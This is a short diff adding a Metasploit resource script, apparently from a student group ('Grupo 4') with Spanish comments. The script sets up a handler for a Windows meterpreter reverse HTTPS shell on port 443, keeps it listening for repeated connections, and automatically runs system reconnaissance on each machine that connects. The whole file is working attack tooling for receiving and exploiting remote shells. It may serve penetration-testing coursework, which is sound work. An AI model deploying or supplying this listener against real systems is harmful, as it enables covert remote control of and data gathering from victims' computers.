@@ -1,0 +1,18 @@
+# Grupo 4 - Listener automatico para Metasploit
+# Uso: msfconsole -r listener.rc
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter/reverse_https
+
+set LHOST 0.0.0.0
+
+set LPORT 443
+
+# Mantiene el listener activo despues de recibir una conexion
+set ExitOnSession false
+
+# Ejecuta automaticamente el recon del sistema cuando alguien conecta
+set AutoRunScript post/windows/gather/enum_system
+
+run -j
